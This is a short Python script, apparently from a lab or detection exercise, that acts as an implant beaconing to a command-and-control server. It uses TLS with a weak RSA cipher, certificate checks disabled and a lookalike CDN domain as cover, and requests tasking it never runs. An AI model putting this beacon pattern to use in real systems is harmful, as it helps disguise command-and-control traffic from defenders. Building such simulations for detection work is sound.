#!/usr/bin/env python3
"""Implante que hace beacon al C2 por TLS (cipher RSA) y recibe el tasking."""
import os
import socket
import ssl
import time

C2 = os.environ.get("C2_HOST", "c2server")
START_DELAY = int(os.environ.get("START_DELAY", "6"))


def log(m):
    print(m, flush=True)


def main():
    time.sleep(START_DELAY)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    ctx.set_ciphers("AES128-SHA:@SECLEVEL=0")
    for i in range(40):
        try:
            with socket.create_connection((C2, 443), timeout=3) as raw:
                break
        except OSError:
            time.sleep(1)
    for i in range(3):
        try:
            raw = socket.create_connection((C2, 443), timeout=5)
            s = ctx.wrap_socket(raw, server_hostname="updates.northw1nd-cdn.com")
            log(f"[implant] beacon TLS al C2 (cipher {s.cipher()[0]}) #{i+1}")
            s.sendall(b"GET /task HTTP/1.1\r\nHost: updates.northw1nd-cdn.com\r\n\r\n")
            s.recv(4096)
            s.close()
        except Exception as e:
            log(f"[implant] error: {e}")
        time.sleep(1.5)
    log("[implant] beaconing completado.")
    open("/tmp/session_done", "w").close()
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
